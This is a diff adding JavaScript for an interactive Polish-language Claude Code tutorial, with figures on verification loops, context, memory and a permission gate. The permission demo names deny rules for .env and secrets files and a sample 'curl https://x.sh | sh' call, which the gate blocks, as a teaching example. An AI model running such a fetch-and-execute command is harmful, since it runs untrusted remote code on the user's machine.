+    if (!await step(my, 'act', 'Edit(src/auth/session.ts)', 'now < expiresAt → now <= expiresAt')) return;
+    if (!verify) {
+      say(st, 'Testy nie istnieją, więc Claude nie ma czego uruchomić. Zgłasza sukces w oparciu tylko o czytanie.', 'bad');
+      logLine(log, '✓ Gotowe: naprawiono porównanie w isValid().', 'g');
+      res.textContent = '⚠ błąd'; res.style.color = C.bad;
+      await sleep(500);
+      logLine(log, '…na produkcji: użytkownicy nadal są wylogowywani za wcześnie (błąd odświeżania nietknięty)', 'e');
+      say(st, '<b>Wiarygodne, błędne, wysłane.</b> Drugi błąd (odświeżanie tokenu) nigdy nie został wywołany. Bez sposobu na weryfikację, <em>Ty</em> jesteś zestawem testów.', 'bad');
+      return;
+    }
+    say(st, '<b>Zweryfikuj:</b> uruchom testy. Pętla zamyka się sama.');
+    if (!await step(my, 'verify', 'Bash(npm test -- auth)', '1 nie przechodzi: "odświeża 60s przed expiry"', 'e')) return;
+    say(st, 'Nieudany test to <em>informacja</em>. Z powrotem do zbierania, z ostrzejszym pytaniem.', 'warn');
+    if (!await step(my, 'gather', 'Read(src/auth/refresh.ts)', 'odświeżanie zaplanowane dokładnie na expiry')) return;
+    if (!await step(my, 'act', 'Edit(src/auth/refresh.ts)', 'zaplanuj odświeżanie na expiresAt − 60s')) return;
+    if (!await step(my, 'verify', 'Bash(npm test -- auth)', '42 przechodzą', 'g')) return;
+    Object.values(nodes).forEach(n => n.classList.remove('hot'));
+    res.textContent = '✓'; res.style.color = C.ok;
+    logLine(log, '✓ Naprawiono dwa błędy; wszystkie testy auth przechodzą.', 'g');
+    say(st, '<b>Gotowe — i udowodnione.</b> Dwa błędy, znalezione, bo pętla mogła sama się sprawdzić. Ten sam model, ten sam prompt; różnicą jest zestaw testów.', 'ok');
+  }
+  async function steer() {
+    const my = ++run;
+    reset(); run = my;
+    user('test logowania nie przechodzi — napraw go');
+    if (!await step(my, 'gather', 'Grep("login", src/)', '3 trafienia w src/auth/')) return;
+    if (!await step(my, 'gather', 'Read(src/auth/session.ts)', 'isValid() używa now < expiresAt')) return;
+    say(st, 'Claude zaczyna pisać własny helper do porównywania dat…', 'warn');
+    logLine(log, '● Write(src/auth/dateCompare.ts)');
+    await sleep(500); if (my !== run) return;
+    logLine(log, '⎋ Przerwane przez użytkownika', 'e');
+    user('stop — mamy już isExpired() w utils/time.ts, użyj tego');
+    say(st, '<b>Esc</b> zatrzymał krok, zanim wylądował zduplikowany helper. Twoja wiadomość steruje kolejnym krokiem.', 'warn');
+    await sleep(400);
+    if (!await step(my, 'gather', 'Read(src/utils/time.ts)', 'isExpired(ts, marginSec)')) return;
+    if (!await step(my, 'act', 'Edit(src/auth/session.ts)', 'użyj isExpired(expiresAt, 60)')) return;
+    if (!await step(my, 'verify', 'Bash(npm test -- auth)', '42 przechodzą', 'g')) return;
+    res.textContent = '✓'; res.style.color = C.ok;
+    say(st, '<b>Sterowane wcześnie, tania poprawka.</b> Korekta po 2 krokach kosztuje mało; po 20 kosztuje cofnięcie.', 'ok');
+  }
+  $('[data-act=run]', root).onclick = () => enqueue(() => task(true));
+  $('[data-act=noverify]', root).onclick = () => enqueue(() => task(false));
+  $('[data-act=esc]', root).onclick = () => enqueue(steer);
+  $('[data-act=reset]', root).onclick = reset;
+  registerFig(root, { first() { enqueue(() => task(true)); } });
+})();
+
+/* ---------- 2. terminal ---------- */
+(() => {
+  const root = $('#fig-term'), out = $('#term-out'), inp = $('#term-inp'), modeEl = $('#term-mode'), st = $('#term-status');
+  const MODES = ['⏸ tryb ręczny włączony', '⏵⏵ akceptowanie edycji włączone', '⏸ plan mode włączony', '⏵⏵ tryb auto włączony'];
+  let mode = 0, run = 0;
+  const enqueue = makeQueue();
+  function line(html, cls = '') { const d = H('div', cls, html, out); out.scrollTop = out.scrollHeight; return d; }
+  async function type(my, text) {
+    for (const ch of text) { if (my !== run) return false; inp.textContent += ch; await sleep(32); }
+    return my === run;
+  }
+  function enter(prefixCls = 'c-acc') { line('&gt; ' + inp.textContent.replace(/</g, '&lt;'), prefixCls); inp.textContent = ''; }
+  function reset() { run++; out.innerHTML = ''; inp.textContent = ''; mode = 0; modeEl.textContent = MODES[0]; say(st, 'Pasek prompta na dole pokazuje tryb uprawnień — patrz, jak się zmienia.'); line('Claude Code · ~/my-project', 'c-mut'); }
+  const acts = {
+    async slash(my) {
+      say(st, '<code>/</code> otwiera menu komend: wbudowane komendy, dołączone skille i Twoje własne skille. Pisz, by filtrować.');
+      if (!await type(my, '/co')) return;
+      const m = H('div', 'menu', '<div class="sel">/compact  — podsumuj rozmowę</div><div>/config  — ustawienia</div><div>/context  — wizualizuj zużycie kontekstu</div><div>/code-review  — zrecenzuj diff</div>', out);
+      await sleep(900); if (my !== run) return;
+      m.children[0].classList.remove('sel'); m.children[2].classList.add('sel');
+      await sleep(600); if (my !== run) return;
+      m.remove(); inp.textContent = '/context'; enter();
+      line('⛁ ⛁ ⛁ ⛀ ⛶ ⛶ ⛶ ⛶ ⛶ ⛶   <span class="c-or">claude-opus-5-5 · 38K/200K tokenów (19%)</span>');
+      line('<span class="c-mut">Prompt systemowy 4K · Narzędzia 12K · Pliki pamięci 3K · Skille 1K · Wiadomości 18K</span>');
+    },
+    async at(my) {
+      say(st, '<code>@</code> autouzupełnia ścieżkę pliku i wkłada ten plik bezpośrednio do kontekstu — bez potrzeby szukania.');
+      if (!await type(my, 'explain @src/au')) return;
+      const m = H('div', 'menu', '<div class="sel">src/auth/session.ts</div><div>src/auth/login.ts</div><div>src/auth/</div>', out);
+      await sleep(900); if (my !== run) return;
+      m.remove(); inp.textContent = 'explain @src/auth/session.ts ';
+      if (!await type(my, 'token refresh')) return;
+      enter();
+      line('● Read(src/auth/session.ts)', 'c-ok');
+      line('Tokeny odświeżają się 60s przed wygaśnięciem: <span class="c-or">scheduleRefresh()</span> ustawia timer od <span class="c-or">expiresAt − 60_000</span>…');
+    },
+    async bang(my) {
+      say(st, '<code>!</code> uruchamia komendę shell <em>samodzielnie</em>. Wynik trafia do rozmowy, a Claude na niego odpowiada. Bez prośby o uprawnienia.');
+      if (!await type(my, '! git status --short')) return;
+      enter('c-or');
+      line(' M src/auth/session.ts', 'c-mut'); line('?? notes.md', 'c-mut');
+      await sleep(500); if (my !== run) return;
+      line('● Jeden zmodyfikowany plik (session.ts) i nieśledzony notes.md. Skomitować poprawkę i zignorować notes.md?');
+    },
+    async tab(my) {
+      mode = (mode + 1) % MODES.length; modeEl.textContent = MODES[mode];
+      modeEl.animate([{ transform: 'scale(1.25)' }, { transform: 'none' }], { duration: 400 });
+      const why = ['Ręczny: Claude pyta przed edycjami i komendami.', 'Akceptowanie edycji: edycje plików i typowe komendy fs działają bez pytania.', 'Plan mode: tylko badanie, bez edycji — Claude proponuje plan.', 'Tryb auto: model-klasyfikator przegląda działania zamiast Ciebie i blokuje ryzykowne. Pojawia się w cyklu, gdy tryb auto jest dostępny (wspierany model, nie wyłączony przez Twoją organizację); na Pro, Max i Team jest domyślnym trybem startowym.'];
+      say(st, `<kbd>Shift+Tab</kbd> → <b>${MODES[mode]}</b>. ${why[mode]}`);
+    },
+    async btw(my) {
+      say(st, '<code>/btw</code> zadaje pytanie z boku. Odpowiedź jest pokazana, ale nigdy nie trafia do historii rozmowy — zero kosztu kontekstu później.');
+      if (!await type(my, '/btw what does claude -w do?')) return;
+      enter();
+      line('<span class="c-mut">(odpowiedź z boku · niezapisana)</span> Uruchamia sesję we własnym worktree gita pod .claude/worktrees/, na nowym branchu.');
+    },
+    async escesc(my) {
+      say(st, 'Przy pustym prompcie, <kbd>Esc</kbd> <kbd>Esc</kbd> otwiera menu cofania: każdy prompt to checkpoint.');
+      const m = H('div', 'menu', '<div>1 · explain the auth flow</div><div>2 · refactor session.ts to classes</div><div class="sel">3 · also rename every file to kebab-case</div>', out);
+      await sleep(700); if (my !== run) return;
+      m.children[2].classList.remove('sel'); m.children[1].classList.add('sel');
+      await sleep(700); if (my !== run) return;
+      m.remove();
+      line('⏪ Przywrócić kod i rozmowę do stanu przed „refactor session.ts to classes”? <span class="c-ok">tak</span>');
+      line('✓ Przywrócono 7 plików. Rozmowa cofnięta.', 'c-ok');
+    }
+  };
+  for (const k in acts) $(`[data-act=${k}]`, root).onclick = () => enqueue(() => acts[k](run));
+  $('[data-act=reset]', root).onclick = reset;
+  reset();
+  registerFig(root, { first() { enqueue(() => acts.slash(run)); enqueue(() => acts.at(run)); } });
+})();
+
+/* ---------- 3. okno kontekstu ---------- */
+(() => {
+  const root = $('#fig-ctx'), bar = $('#ctx-main'), sub = $('#ctx-sub'), st = $('#ctx-status');
+  const num = $('#ctx-num'), noiseEl = $('#ctx-noise'), bub = $('#ctx-bubble');
+  const CAP = 200000, AUTO = 0.9 * CAP;
+  const lim = H('div', 'limit', null, bar); lim.style.left = '90%'; lim.title = 'próg auto-kompaktacji (poglądowy)';
+  let s, subV;
+  function paint() {
+    paintBar(bar, [
+      { k: 'sys', v: s.sys, c: TOK.sys, t: 'system' }, { k: 'mem', v: s.mem, c: TOK.mem, t: 'pamięć' },
+      { k: 'sum', v: s.sum, c: TOK.sum, t: 'podsumowanie' }, { k: 'work', v: s.work, c: TOK.work, t: 'praca nad zadaniem' },
+      { k: 'noise', v: s.noise, c: TOK.noise, t: 'szum' }], CAP);
+    paintBar(sub, [{ k: 'w', v: subV, c: TOK.work, t: 'czytanie subagenta' }], CAP);
+    const tot = s.sys + s.mem + s.sum + s.work + s.noise;
+    num.textContent = kfmt(tot);
+    const conv = s.sum + s.work + s.noise;
+    noiseEl.textContent = conv ? Math.round(100 * s.noise / conv) + '%' : '0%';
+    noiseEl.style.color = s.noise / (conv || 1) > .3 ? C.bad : '';
+    return tot;
+  }
+  function reset() { s = { sys: 16000, mem: 5000, sum: 0, work: 0, noise: 0 }; subV = 0; bub.innerHTML = ''; paint(); say(st, 'Świeża sesja już zużywa część kontekstu na prompt systemowy, narzędzia i CLAUDE.md.'); }
+  function compact(auto) {
+    const conv = s.sum + s.work + s.noise;
+    s.sum = Math.max(3000, Math.round(conv * .1)); s.work = 0; s.noise = 0; paint();
+    say(st, auto ? '<b>Auto-kompaktacja!</b> Okno trafiło w próg, więc historia została zastąpiona podsumowaniem. Stało się to w środku zadania, według własnego harmonogramu — a podsumowanie może zgubić potrzebne szczegóły.'
+      : '<b>/compact</b>: historia → podsumowanie. Ty wybrałeś moment i możesz podać focus (<code>/compact keep the API decisions</code>). Szum też się zmniejsza, ale jego ślady żyją dalej w podsumowaniu.', auto ? 'bad' : 'ok');
+  }
+  function add(k, v, msg, cls) {
+    s[k] += v;
+    if (paint() > AUTO) { setTimeout(() => compact(true), REDUCE ? 0 : 750); }
+    say(st, msg, cls);
+  }
+  const acts = {
+    read() { add('work', 45000, '<b>+45K</b>: trzy duże pliki. Przydatne, ale duże. Odczyty plików dominują zużycie kontekstu — nazwij dokładny plik i funkcję, by Claude czytał mniej (uwaga: <code>@plik</code> ściąga cały plik).'); },
+    tangent() { add('noise', 14000, '<b>+14K szumu</b>: niepowiązane pytanie i jego odpowiedź. Zostaje w kontekście i konkuruje o uwagę z Twoim prawdziwym zadaniem. Nowy temat → <code>/clear</code> albo <code>/btw</code>.', 'warn'); },
+    async sub() {
+      say(st, 'Subagent szuka we <em>własnym</em> oknie…');
+      await tween(900, k => { subV = 60000 * k; paint(); });
+      add('work', 2000, '<b>+2K</b> w głównym oknie: wróciło tylko podsumowanie subagenta. 60K czytania zostało tam.', 'ok');
+    },
+    btw() {
+      bub.innerHTML = '<span class="bubble">💬 odpowiedź pokazana, niezachowana</span>';
+      const b = bub.firstChild; setTimeout(() => { b.style.opacity = 0; }, REDUCE ? 1200 : 1600);
+      say(st, '<b>/btw</b>: odpowiedź się pojawia, ale nigdy nie trafia do historii. Zero dodanych tokenów.', 'ok');
+    },
+    compact() { compact(false); },
+    clear() { s.sum = s.work = s.noise = 0; subV = 0; paint(); say(st, '<b>/clear</b>: powrót do świeżego okna. Prompt systemowy i pamięć ładują się ponownie; reszta znika. Idealne między niepowiązanymi zadaniami — jeśli decyzje zostały zapisane w plikach.', 'ok'); }
+  };
+  for (const k in acts) $(`[data-act=${k}]`, root).onclick = acts[k];
+  $('[data-act=reset]', root).onclick = reset;
+  reset();
+  registerFig(root, { async first() { await sleep(300); acts.read(); await sleep(1200); acts.tangent(); await sleep(1200); acts.read(); } });
+})();
+
+/* ---------- 4. pamięć ---------- */
+(() => {
+  const root = $('#fig-mem'), tree = $('#mem-tree'), loaded = $('#mem-loaded'), meter = $('#mem-meter'), st = $('#mem-status');
+  const rows = [
+    ['managed', '/Library/…/ClaudeCode/CLAUDE.md', 0, 'managed', 'md'],
+    ['user', '~/.claude/CLAUDE.md', 0, 'user', 'md'],
+    ['repo', 'repo/', 0, '', 'dir'],
+    ['project', 'CLAUDE.md', 1, 'project · 60 linii', 'md'],
+    ['local', 'CLAUDE.local.md', 1, 'local', 'md'],
+    ['rules', '.claude/rules/api.md', 1, 'paths: src/api/**', 'md'],
+    ['apifile', 'src/api/users.ts', 1, '', 'dir'],
+    ['webdir', 'packages/web/', 1, '', 'dir'],
+    ['nested', 'CLAUDE.md', 2, 'nested', 'md'],
+    ['webfile', 'App.tsx', 2, '', 'dir'],
+    ['auto', '~/.claude/projects/…/memory/MEMORY.md', 0, 'automatyczna pamięć', 'md']
+  ];
+  const el = {};
+  rows.forEach(([id, name, ind, note, kind]) => {
+    const d = H('div', kind, `${'&nbsp;&nbsp;&nbsp;'.repeat(ind)}${kind === 'md' ? '📝' : name.endsWith('/') ? '📁' : '📄'} ${name} ${note ? `<small>${note}</small>` : ''}`, tree);
+    el[id] = d;
+  });
+  let run = 0, bloated = false;
+  const enqueue = makeQueue();
+  function reset() {
+    run++; bloated = false; loaded.innerHTML = ''; Object.values(el).forEach(d => d.classList.remove('on', 'touch'));
+    el.project.querySelector('small').textContent = 'project · 60 linii';
+    meter.style.width = '0'; meter.style.background = C.ok;
+    say(st, 'Nic nie jest załadowane przed startem sesji.');
+  }
+  async function load(my, id, label, why) {
+    if (my !== run) return false;
+    el[id].classList.add('on');
+    const it = H('div', 'it', `${label}<i>${why}</i>`, loaded);
+    requestAnimationFrame(() => it.classList.add('shown'));
+    await sleep(420);
+    return my === run;
+  }
+  const started = () => el.user.classList.contains('on');
+  async function start(my) {
+    if (started()) return;
+    say(st, 'Przy starcie Claude Code idzie od katalogu roboczego w górę i ładuje każdy znaleziony CLAUDE.md, plus pliki użytkownika i zarządzane.');
+    if (!await load(my, 'managed', '🏢 polityka zarządzana', 'ogólnofirmowa, nie da się wykluczyć')) return;
+    if (!await load(my, 'user', '👤 ~/.claude/CLAUDE.md', 'Twoje preferencje, każdy projekt')) return;
+    if (!await load(my, 'project', '📦 repo/CLAUDE.md', 'konwencje zespołu, commitowane')) return;
+    if (!await load(my, 'local', '🔒 CLAUDE.local.md', 'Twoje prywatne notatki dla tego repo')) return;
+    if (!await load(my, 'auto', '🧠 automatyczna pamięć', 'pierwsze 200 linii / 25KB z MEMORY.md')) return;
+    meter.style.width = bloated ? '42%' : '90%';
+    say(st, 'Pięć źródeł, wszystkie <b>zsumowane</b>. Zauważ, co <em>nie</em> jest jeszcze załadowane: zagnieżdżony CLAUDE.md i reguła zawężona ścieżką.', 'ok');
+  }
+  async function touch(my, fileId, memId, label, why, msg) {
+    await start(my); if (my !== run) return;
+    el[fileId].classList.add('touch'); await sleep(450);
+    if (el[memId].classList.contains('on')) { say(st, 'Już załadowane — zostaje w kontekście (po kompaktacji ładuje się ponownie następnym razem, gdy Claude czyta tam plik).'); return; }
+    if (!await load(my, memId, label, why)) return;
+    say(st, msg, 'ok');
+  }
+  const acts = {
+    start: my => start(my),
+    web: my => touch(my, 'webfile', 'nested', '📂 packages/web/CLAUDE.md', 'załadowany leniwie: Claude przeczytał plik w tym folderze', 'Zagnieżdżone pliki CLAUDE.md ładują się <b>na żądanie</b>, gdy Claude czyta pliki w ich katalogu. Reguły frontendu nigdy nie kosztują kontekstu w sesji tylko backendowej.'),
+    api: my => touch(my, 'apifile', 'rules', '📏 rules/api.md', 'paths: src/api/** dopasowane', 'Reguła z frontmatterem <code>paths:</code> ładuje się tylko, gdy Claude pracuje z pasującymi plikami. To trzyma CLAUDE.md krótko.'),
+    async bloat(my) {
+      bloated = true; el.project.querySelector('small').textContent = 'project · 900 linii';
+      el.project.classList.add('touch');
+      meter.style.width = started() ? '42%' : '0'; meter.style.background = C.bad;
+      say(st, '<b>900 linii.</b> Każde żądanie teraz je niesie, a ważne reguły toną w szumie: Claude zaczyna niektóre ignorować. Naprawa: przytnij to, co Claude już robi dobrze, przenieś procedury do skilli, zawęź resztę przez <code>.claude/rules/</code>, zamień konieczności w hooki.', 'bad');
+    }
+  };
+  for (const k in acts) $(`[data-act=${k}]`, root).onclick = () => enqueue(() => acts[k](run));
+  $('[data-act=reset]', root).onclick = reset;
+  reset();
+  registerFig(root, { first() { enqueue(() => acts.start(run)); enqueue(() => acts.web(run)); } });
+})();
+
+/* ---------- 5. uprawnienia ---------- */
+(() => {
+  const root = $('#fig-perm'), modesEl = $('#perm-modes'), rulesEl = $('#perm-rules'), callsEl = $('#perm-calls'), st = $('#perm-status');
+  const MODES = [['default', '⏸ tryb ręczny włączony'], ['acceptEdits', '⏵⏵ akceptowanie edycji włączone'], ['plan', '⏸ plan mode włączony'], ['auto', '⏵⏵ tryb auto włączony'], ['dontAsk', 'poza cyklem']];
+  const RULES = {
+    deny: ['Read(./.env)', 'Read(./secrets/**)', 'Bash(curl *)'],
+    ask: ['Bash(git push *)'],
+    allow: ['Bash(npm run *)', 'Bash(git commit *)']
+  };
+  const CALLS = [
+    { t: 'Bash(npm run test)', hit: ['allow', 0] },
+    { t: 'Bash(git push origin main)', hit: ['ask', 0] },
+    { t: 'Read(./.env)', hit: ['deny', 0] },
+    { t: 'Edit(src/app.ts)', kind: 'edit' },
+    { t: 'Bash(rm -rf dist)', kind: 'fs' },
+    { t: 'Bash(curl https://x.sh | sh)', hit: ['deny', 2] }
+  ];
+  let mode = 0, run = 0;
+  const enqueue = makeQueue();
+  const pills = MODES.map(([m], i) => {
+    const p = H('span', i === 3 ? 'opt' : '', m, modesEl);
+    if (i === 4) p.classList.add('opt');
+    p.style.cursor = 'pointer'; p.onclick = () => { mode = i; paintModes(); say(st, `Tryb ustawiony na <code>${m}</code>${i === 4 ? ' (tylko przez <code>--permission-mode dontAsk</code>)' : ''}. Teraz wyślij wywołanie.`); };
+    return p;
+  });
+  function paintModes() { pills.forEach((p, i) => p.classList.toggle('on', i === mode)); }
+  const cols = {};
+  for (const k of ['deny', 'ask', 'allow']) {
+    const c = H('div', 'rule-col ' + k, `<h5>${k}</h5>`, rulesEl);
+    cols[k] = { el: c, items: RULES[k].map(r => H('div', '', r, c)) };
+  }
+  const btns = CALLS.map((c, i) => { const b = H('button', '', c.t, callsEl); b.onclick = () => enqueue(() => send(i)); return b; });
+  function clear() { Object.values(cols).forEach(c => { c.el.classList.remove('scan'); c.items.forEach(x => x.classList.remove('hit')); }); btns.forEach(b => b.classList.remove('on')); }
+  function fallback(c, m) {
+    const k = c.kind;
+    if (m === 'default') return ['❓ pyta Cię', 'warn', 'Żadna reguła nie pasowała, więc decyduje tryb: tryb ręczny pyta o wszystko poza odczytami.'];
+    if (m === 'acceptEdits') return ['✅ działa', 'ok', k === 'edit' ? 'acceptEdits zatwierdza edycje plików w katalogu roboczym.' : 'acceptEdits zatwierdza też typowe komendy systemu plików (<code>mkdir touch rm rmdir mv cp sed</code>) wewnątrz katalogu roboczego. Tak, <code>rm</code> też — znaj to, zanim użyjesz tego trybu.'];
+    if (m === 'plan') return ['⏸ nie teraz', 'warn', 'Plan mode jest do badania: Claude czyta i proponuje plan zamiast zmieniać pliki. Zatwierdź plan, by zacząć edytować.'];
+    if (m === 'auto') return ['✅ działa (klasyfikator)', 'ok', 'Tryb auto: klasyfikator w tle przegląda działanie w kontekście. Usunięcie folderu build wewnątrz projektu przechodzi; coś destrukcyjnego albo poza zadaniem zostałoby zablokowane.'];
+    return ['⛔ odmówiono', 'bad', 'dontAsk: wszystko, co wymagałoby pytania, jest odmawiane. Działają tylko odczyty i wcześniej zatwierdzone narzędzia — idealne dla CI.'];
+  }
+  async function send(i) {
+    const my = ++run; clear(); btns[i].classList.add('on');
+    const c = CALLS[i], m = MODES[mode][0];
+    say(st, `<code>${c.t}</code> wchodzi do bramki…`);
+    for (const k of ['deny', 'ask', 'allow']) {
+      cols[k].el.classList.add('scan'); await sleep(420); if (my !== run) return;
+      if (c.hit && c.hit[0] === k) {
+        cols[k].items[c.hit[1]].classList.add('hit'); await sleep(300);
+        if (k === 'deny') return say(st, `<span class="verdict">⛔ odmówiono</span> — pasuje do reguły deny <code>${RULES.deny[c.hit[1]]}</code>. Deny jest sprawdzane pierwsze; żaden tryb ani reguła allow nie mogą go nadpisać.`, 'bad');
+        if (k === 'ask') return m === 'dontAsk'
+          ? say(st, `<span class="verdict">⛔ odmówiono</span> — reguła ask chce zapytać, a dontAsk zamienia każde pytanie w odmowę.`, 'bad')
+          : say(st, `<span class="verdict">❓ pyta Cię</span> — pasuje do reguły ask <code>${RULES.ask[0]}</code>. Reguły ask pytają nawet w permisywnych trybach: dobre dla pushów i deployów.`, 'warn');
+        return say(st, `<span class="verdict">✅ działa</span> — pasuje do reguły allow <code>${RULES.allow[c.hit[1]]}</code>, w dowolnym trybie. Tak przestajesz być pytany o <code>npm test</code> 50 razy dziennie.`, 'ok');
+      }
+      cols[k].el.classList.remove('scan');
+    }
+    const [v, cls, why] = fallback(c, m);
+    say(st, `<span class="verdict">${v}</span> — żadna reguła nie pasowała → decyduje tryb <code>${m}</code>. ${why}`, cls);
+  }
+  function reset() { run++; mode = 0; paintModes(); clear(); say(st, 'Wybierz wywołanie narzędzia, by przepuścić je przez bramkę.'); }
+  $('[data-act=cycle]', root).onclick = () => { mode = (mode + 1) % 4; paintModes(); say(st, `<kbd>Shift+Tab</kbd> → <b>${MODES[mode][1]}</b>. (<code>dontAsk</code> nigdy nie jest w cyklu.)`); };
+  $('[data-act=reset]', root).onclick = reset;
+  reset();
+  registerFig(root, { first() { enqueue(() => send(0)); enqueue(() => sleep(900)); enqueue(() => send(2)); enqueue(() => send(4)); } });
+})();
+
+/* ---------- 6. wyścig planu ---------- */
+(() => {
+  const root = $('#fig-plan'), A = $('#plan-a'), B = $('#plan-b'), ta = $('#plan-ta'), tb = $('#plan-tb'), sel = $('#plan-size'), st = $('#plan-status');
+  const COL = { explore: '#1b6fa8', plan: '#8e44ad', code: '#2f9e63', verify: '#c98a00', rework: '#d64545' };
+  const DATA = {
+    small: { a: [['code', 1], ['verify', 1]], b: [['explore', 2], ['plan', 2], ['code', 1], ['verify', 1]],
+      msg: 'Dla jednolinijkowej poprawki planowanie to czysty narzut: <b>2 vs 6 min</b>. Jeśli potrafisz opisać diff jednym zdaniem, pomiń plan.' },
+    mid: { a: [['code', 6], ['verify', 2], ['rework', 6], ['verify', 2]], b: [['explore', 3], ['plan', 3], ['code', 6], ['verify', 2]],
+      msg: 'Zadanie średnie: mniej więcej remis. Bezpośrednia ścieżka straciła przewagę na jednym cyklu poprawek (błędny domysł co do istniejącego wzorca).' },
+    big: { a: [['code', 20], ['verify', 5], ['rework', 25], ['verify', 5], ['rework', 15], ['verify', 4]], b: [['explore', 8], ['plan', 8], ['code', 22], ['verify', 5], ['rework', 4], ['verify', 2]],
+      msg: '15 plików: planowanie wygrywa z dużą przewagą. Kodowanie od razu rozwiązało zły problem dwukrotnie; każda poprawka też zapychała kontekst martwymi tropami. Plan mode + <kbd>Ctrl+G</kbd>, by poprawić plan, kosztowały 16 min i zaoszczędziły 25.' }
+  };
+  let run = 0;
+  const tot = a => a.reduce((s, x) => s + x[1], 0);
+  async function lane(my, track, timeEl, steps, scale) {
+    let t = 0;
+    for (const [k, m] of steps) {
+      if (my !== run) return;
+      const b = H('div', 'blk', k, track); b.style.background = COL[k];
+      await sleep(20);
+      b.style.transition = REDUCE ? 'none' : `width ${m * 70}ms linear`;
+      b.style.width = (100 * m / scale) + '%';
+      const t0 = t; await tween(m * 70, k2 => { timeEl.textContent = Math.round(t0 + m * k2) + ' min'; });
+      t += m;
+    }
+  }
+  async function race() {
+    const my = ++run; A.innerHTML = ''; B.innerHTML = ''; ta.textContent = tb.textContent = '0 min';
+    const d = DATA[sel.value], scale = Math.max(tot(d.a), tot(d.b));
+    say(st, 'Wyścig w toku…');
+    await Promise.all([lane(my, A, ta, d.a, scale), lane(my, B, tb, d.b, scale)]);
+    if (my === run) say(st, d.msg, sel.value === 'small' ? 'warn' : 'ok');
+  }
+  $('[data-act=race]', root).onclick = race;
+  sel.onchange = race;
+  $('[data-act=reset]', root).onclick = () => { run++; A.innerHTML = ''; B.innerHTML = ''; ta.textContent = tb.textContent = '0 min'; say(st, 'Wybierz rozmiar zadania i uruchom wyścig.'); };
+  registerFig(root, { first: race });
+})();
+
+/* ---------- 7. budowniczy promptów ---------- */
+(() => {
+  const root = $('#fig-prompt'), ingr = $('#pr-ingr'), box = $('#pr-box'), guess = $('#pr-guess'), st = $('#pr-status');
+  const I = [
+    ['📍 Gdzie', 'w @src/auth/session.ts', 'Który plik? (Claude grepuje całe repo)'],
+    ['🩺 Objaw', 'Użytkownicy są wylogowywani po ~15 min nawet przy „zapamiętaj mnie”. Zaczęło się od commita a1b2c3.', 'Co dokładnie jest zepsute?'],
+    ['🧩 Wzorzec', 'Podążaj za helperami tokenów w @src/auth/tokens.ts.', 'Które podejście i styl?'],
+    ['🏁 Weryfikacja', 'Najpierw napisz nieprzechodzący test w session.test.ts, potem spraw, by `pnpm test auth` przechodził.', 'Skąd wiem, że skończyłem?'],
+    ['🚧 Ograniczenia', 'Nie zmieniaj publicznego API AuthClient. Żadnych nowych zależności.', 'Co nie może się zmienić?']
+  ];
+  const cbs = I.map(([lbl, , q], i) => {
+    const l = H('label', '', `<input type="checkbox"> <span><b>${lbl}</b></span>`, ingr);
+    const cb = $('input', l); cb.onchange = paint; return cb;
+  });
+  const lis = I.map(([, , q]) => H('li', '', q, guess));
+  function paint() {
+    let html = 'Napraw błąd wylogowania';
+    const on = cbs.map(c => c.checked);
+    if (on[0]) html += ' <span class="add">' + I[0][1] + '</span>';
+    html += '.';
+    for (let i = 1; i < I.length; i++) if (on[i]) html += '\n<span class="add">' + I[i][1].replace(/</g, '&lt;') + '</span>';
+    box.innerHTML = html.replace(/@[\w/.]*\w/g, m => `<b>${m}</b>`);
+    on.forEach((v, i) => lis[i].classList.toggle('done', v));
+    const left = on.filter(v => !v).length;
+    say(st, left === 5 ? '<b>5 domysłów.</b> Claude będzie szeroko eksplorował, wybierze wiarygodny błąd i ogłosi zwycięstwo bez dowodu.'
+      : left === 0 ? '<b>0 domysłów.</b> Claude wie, gdzie patrzeć, co jest nie tak, jak to zrobić, czego nie ruszać — i jak udowodnić, że skończył. Wciąż tylko 5 linii.'
+      : `<b>${left} domysł${left > 1 ? 'y' : ''} pozostał${left > 1 ? 'y' : 'o'}.</b> Każdy to szansa na rozwiązanie innego problemu niż Twój.`, left === 0 ? 'ok' : left === 5 ? 'bad' : 'warn');
+  }
+  let run = 0;
+  async function expert() { const my = ++run; for (const c of cbs) { if (my !== run) return; c.checked = true; paint(); await sleep(550); } }
+  $('[data-act=vague]', root).onclick = () => { run++; cbs.forEach(c => c.checked = false); paint(); };
+  $('[data-act=expert]', root).onclick = expert;
+  $('[data-act=reset]', root).onclick = () => { run++; cbs.forEach(c => c.checked = false); paint(); };
+  paint();
+  registerFig(root, { first() { sleep(500).then(expert); } });
+})();
+
+/* ---------- 8. cofanie ---------- */
+(() => {
+  const root = $('#fig-rewind'), tl = $('#rw-tl'), filesEl = $('#rw-files'), st = $('#rw-status');
+  const P = [
+    ['P1', 'dodaj helper slugify', 'Edit utils.ts'],
+    ['P2', 'użyj go w posts.ts', 'Edit posts.ts'],
+    ['P3', 'usuń stary plik notes', 'Bash rm notes.txt'],
+    ['P4', 'przepisz slugify z regexem', 'Edit utils.ts (testy się psują)']
+  ];
+  const V0 = { utils: '// helpery', posts: 'title → url: ręcznie', notes: 'lista TODO' };
+  let files, played = false, rewound = false, run = 0;
+  const enqueue = makeQueue();
+  const pEls = P.map(([id, t, a]) => H('div', 'p', `<b>${id}</b> „${t}”<br><span class="mut">${a}</span>`, tl));
+  const fEls = {};
+  for (const k of ['utils', 'posts', 'notes']) fEls[k] = H('div', 'file', '', filesEl);
+  function paint() {
+    const name = { utils: 'utils.ts', posts: 'posts.ts', notes: 'notes.txt' };
+    for (const k in fEls) {
+      const f = files[k];
+      fEls[k].innerHTML = `<b>${name[k]}</b>${f.gone ? '<i>usunięty</i>' : f.v}`;
+      fEls[k].className = 'file' + (f.gone ? ' del' : '') + (f.chg ? ' chg' : '') + (f.bad ? ' bad' : '');
+    }
+  }
+  function reset() {
+    run++; played = false; rewound = false;
+    files = { utils: { v: V0.utils }, posts: { v: V0.posts }, notes: { v: V0.notes } };
+    pEls.forEach(p => { p.className = 'p'; const ck = p.querySelector('.ck'); if (ck) ck.remove(); });
+    paint(); say(st, 'Najpierw odtwórz sesję.');
+  }
+  async function play() {
+    if (played) return;
+    const my = ++run;
+    const steps = [
+      () => { files.utils = { v: 'slugify() v1 ✓', chg: 1 }; },
+      () => { files.posts = { v: 'używa slugify() ✓', chg: 1 }; },
+      () => { files.notes = { gone: 1 }; },
+      () => { files.utils = { v: 'slugify() v2 regex ✗', chg: 1, bad: 1 }; }
+    ];
+    for (let i = 0; i < 4; i++) {
+      if (my !== run) return;
+      H('span', 'ck', null, pEls[i]).title = 'checkpoint';
+      pEls[i].classList.add('run');
